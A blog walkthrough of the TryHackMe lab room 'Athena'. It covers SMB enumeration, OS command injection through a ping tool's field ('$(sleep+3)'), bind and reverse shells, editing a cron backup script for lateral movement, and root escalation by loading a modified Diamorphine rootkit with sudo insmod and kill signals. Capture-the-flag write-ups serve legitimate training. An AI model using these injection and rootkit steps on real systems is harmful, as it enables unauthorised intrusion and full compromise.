---
title: "THM | Athena | Medium"
date: 2023-09-17T12:09:08+01:00
draft: false
cover:
    image: "img/athena/Athena.png"
    alt: "Athena"
    caption: "Athena"
tags: ["THM","Medium","OS Injection","RCE","Diamorphine Rootkit"]
categories: ["Rootkit","Responder","Linux"]
weight: 1
---

### This post is a walkthrough of the Try Hack Me room [Athena](https://tryhackme.com/room/4th3n4){style="text-align: center;"}

---

## Intro{style="text-align: center;"}
---

Break all security and compromise the machine. Are you capable of mastering the entire system and exploiting all vulnerabilities?

---

### NMAP Scan

```sh
# Nmap 7.94 scan initiated Sat Sep 16 14:50:30 2023 as: nmap -sVC -T4 -p- -vv -oA nmap/all-tcp-ports 10.10.138.143
Nmap scan report for athena.thm (10.10.138.143)
Host is up, received reset ttl 63 (0.018s latency).
Scanned at 2023-09-16 14:50:31 IST for 25s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3b:c8:f8:13:e0:cb:42:60:0d:f6:4c:dc:55:d8:3b:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqrhWpCkIWorEVg4w8mfia/rsblIvsmSU9y9mEBby77pooZXLBYMvMC0aiaJvWIgPVOXrHTh9IstAF6s9Tpjx+iV+Me2XdvUyGPmzAlbEJRO4gnNYieBya/0TyMmw0QT/PO8gu/behXQ9R6yCjiw9vmsV+99SiCeuIHssGoLtvTwXE2i8kxqr5S0atmBiDkIqlp+qD1WZzc8YP5OU0CIN5F9ytZOVqO9oiGRgI6CP4TwNQwBLU2zRBmUmtbV9FRQyObrB1zCYcEZcKNPzasXHgRkfYMK9OMmUBhi/Hveei3BNtdaWARN9x30O488BmdET3iaTt5gcIgHfAO+5WzUPBswerbcOHp2798DXkuVpsklS9Zi9dvpxoyZFsmu1RoklPWea+rxq09KRjciXNvy+jV8zBGCGKwwi62nL9mRyA5ZakJKrpWCPffnEMK37SHL0WqWMRZI4Bbj2cOpJztJ+5Ttbj5wixecnvZu8hkknfMSVwPM8RqwQuXtes8AqF6gs=
|   256 1f:42:e1:c3:a5:17:2a:38:69:3e:9b:73:6d:cd:56:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPBg1Oa6gqrvB/IQQ1EmM1p5o443v5y1zDwXMLkd9oUfYsraZqddzwe2CoYZD3/oTs/YjF84bDqeA+ILx7x5zdQ=
|   256 7a:67:59:8d:37:c5:67:29:e8:53:e8:1e:df:b0:c7:1e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaJ6imGGkCETvb1JN5TUcfj+AWLbVei52kD/nuGSHGF
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Athena - Gods of olympus
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 9973/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41780/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35605/udp): CLEAN (Failed to receive data)
|   Check 4 (port 36277/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ROUTERPANEL<00>      Flags: <unique><active>
|   ROUTERPANEL<03>      Flags: <unique><active>
|   ROUTERPANEL<20>      Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   SAMBA<00>            Flags: <group><active>
|   SAMBA<1d>            Flags: <unique><active>
|   SAMBA<1e>            Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 0s
| smb2-time: 
|   date: 2023-09-16T13:50:56
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 16 14:50:56 2023 -- 1 IP address (1 host up) scanned in 25.77 seconds
```

Notes from NMAP

Ports 139,445 are Samba smbd 4.6.2
Ports 80 is http and backend is Apache httpd 2.4.41 ((Ubuntu))
Port 22 SSH no passwords yet.

Since the room is called athena I added 'athena.thm' to `/etc/hosts`.

### Port 80 - http

Main Page

Browsing to port 80 http://athena.thm

![Home Page](/img/athena/athena_home.png#center "Athena Homepage")

Checking all the links on this page and the souce code doesn't reveal anything usefull. Moving on to port 445 - smb.

### Port 445

Check for anonymous login.

Anonymous login is allowed and we can see there is a Public shared folder.

```sh
smbclient -L athena.thm -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      
	IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
SMB1 disabled -- no workgroup available
```

Trying anonymous access to the Public shared folder works and we can proceed to view the contents of the Public folder.

```sh
smbclient //athena.thm/public -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

Listing the contents of the folder reveals a text for called 'msg_for_administrator.txt'

![SMB Message](/img/athena/smb_content.png#center "Message in Public Folder")

Download the text file to our attack box to read the contents.

```sh
smb: \> get msg_for_administrator.txt
getting file \msg_for_administrator.txt of size 253 as msg_for_administrator.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \>
```
Read with cat.

```text
cat msg_for_administrator.txt 

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

The message gives us a directory that we can now browse to for further enumeration.

![My Router](/img/athena/myrouter.png#center "My Simple Router")

On accessing the page we see a Ping Tool, which immediately screams "OS Command Injection". To verify if we are correct start Burpsuite and intercept a ping request. But first we take a look at the links on the page to see if they lead anywhere. All the link point to an under construction page.

![Under Contruction](/img/athena/under_construction.png#center "Dead Links")

### Ping Tool

Let's see if we can ping our own kali attack box?

Start tcpdump to catch icmp (ping) sent to us from the Simple Router Panel.

```sh
udo tcpdump -i tun0 icmp               
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

...and sure enough we can!

![Ping Kali](/img/athena/ping_kali.png#center "Ping Kali Host")

Now can we inject os commands after the ping command such as whoami to see if the web page displays the response with userame.

![Append A CMD](/img/athena/append_cmd.png#center "Append Whoami")

This didn't work and the page displays a message telling us it detected a hacking attempt.

![Hacking Message](/img/athena/attempt_hacking.png#center "Hacking Attempt Detected")

Intercept the request with Butpsuite to see if we can manipulate the request. Adding -c1 will ping once and adding $(sleep+3) will sleep for 3 seconds.

![Sleep Injection](/img/athena/sleep.png#center "Inject Sleep")

___References: https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html and https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection___

The sleep for 3 seconds worked a tells us we have Remote Code Execution(RCE) here. Since this is a linux server it may have netcat installed, so we can start a listener with bind shell that we can connect to. Let's give it a try.

![Netcat Bind Shell](/img/athena/ncat.png#center "Start a Netcat Bind Shell")

This gets us a bind shell on the target but I want a reverse shell and want to use pwncat-cs for ease of use. First the Burpsuite starts the bind shell, then we connect ti the shell but then we connect back with a reverse shell.

![Shell Established](/img/athena/shell.png#center "Shell Established")

### Foothold

Now we have a foothold we begin our manual enumeration first before moving to auto enumeration methods.

Check what users are on the box.  We can see 3 users and there UIDs, root, ubuntu and athena.  We can ignore ubuntu and try latterally move to Athena then privilege escalate to root.

![Users](/img/athena/users.png#center "Enumerate Users")

Checking crontab and listing proccesses didn't give me much to work on, but uploading `pspy64` to the server and leaving it run for a bit shows a recurring backup that runs under the UID of 1001. Looking at the users we found and especially the UID we can tell the `backup.sh` is running under the user Athena account.  If can edit this backup file we should be able to latterally move to the user Athena.

Upload pspy64 to /tmp

![Upload PSPY](/img/athena/pyspy_up.png#center "Uploaded PSPY")

Give pspy execute permissions.

![Execute Permissions](/img/athena/pspy_perms.png#center "Give Execute Permissions")

After a minute or two we can see the backup script running.

![Backup Script](/img/athena/backup_sh.png#center "Backup Script Runnning")

Check the permissions of the backup.sh file and we can edit the file. All we need to do here now is start another listener on our kali box and use ncat to connect back to it from the `backup.sh` script.

![Edit Permission](/img/athena/edit_perm.png#center "We can Edit the Backup File")

Modified `backup.sh` file.

![Add Revshell](/img/athena/edit_backup.png#center "Edited Backup Script")

Setup pwncat-cs to listen on port 9002 and now we get another shell as user Athena.


### User Flag

![User Flag](/img/athena/user_flag.png#center "User Flag Found")

More manual enumeration. See if we have permission to run anything with sudo permission.

![Sudo Permissions](/img/athena/sudo_l.png#center "Sudo Permissions")

```sh
(remote) athena@routerpanel:/home/athena$ sudo -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

While conducting user enumeration for 'Athena', we promptly identified an interesting entry in the sudo privileges (`sudo -l`). This revealed a privilege escalation opportunity. By utilizing `sudo` with the `insmod` command, we were able to load a specific kernel module located at `/mnt/.../secret/venom.ko` without the need for a password. The `insmod` command in Linux allows for the manual insertion or loading of kernel modules into the active Linux kernel. Kernel modules are essential pieces of code that can be dynamically integrated into the kernel, and enable the enhancement in its capabilities and functionalities.

Download venom.ko and use Ghidra to statically analyse it.

Looking at the functions we can tell right away this is the rootkit Diamorphine.

Having seen this root kit before on Try Hack Me's room called 'Takedown' and had bookmarked the github repo where we can compare the source code to the original rootkit.

![Ghidra Diamorphine](/img/athena/ghidra_funct.png#center "Diamorphine Funtions")

**Hacked_kill Function.**

Diamorphine Source Code

https://github.com/m0nad/Diamorphine

Normal Features

```text
Features

When loaded, the module starts invisible;

Hide/unhide any process by sending a signal 31;

Sending a signal 63(to any pid) makes the module become (in)visible;

Sending a signal 64(to any pid) makes the given user become root;

Files or directories starting with the MAGIC_PREFIX become invisible;
```
Original Source Code

https://raw.githubusercontent.com/m0nad/Diamorphine/master/diamorphine.h

![Original C Code](/img/athena/org_code_1.png#center "Original Code")

Shows the original values for the kill command.

https://raw.githubusercontent.com/m0nad/Diamorphine/master/diamorphine.c

![Original C File](/img/athena/org_code_2.png#center "Orginal C Code")

Below we can see that the function hacked_kill has been modified in the original source code the original values were 63 and 64.

![Venom Code](/img/athena/venom_mod.png#center "Venom Modded Code")

To interact with the rootkit I created an ssh public key for a user called marzo and added the key to `/home/athena/.ssh/authorized.keys`

```sh
ssh-keygen -f marzo

ssh -i marzo athena@athena.thm
```

### Privilege Escalate To Root

Stable SSH session Established.

![Stable SSH](/img/athena/stable_ssh.png#center "Stable SSH Connection")

Load the Venom (Diamorphine RootKit)

```sh
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
kill -63 0
lsmod | grep venom

venom                  16384  0
```

The venom kernel module is showing as loaded now.

Run the following to get root access.
```sh
kill -57 0
id
```

![Escalate to Root](/img/athena/privesc.png#center "Privesc to Root User")


Now Grab the root flag. 🏆

![Root Flag](/img/athena/root_flag.png#center "Root Flag Found")

---

![Congrats](/img/athena/congrats.png#center "Congratualtions")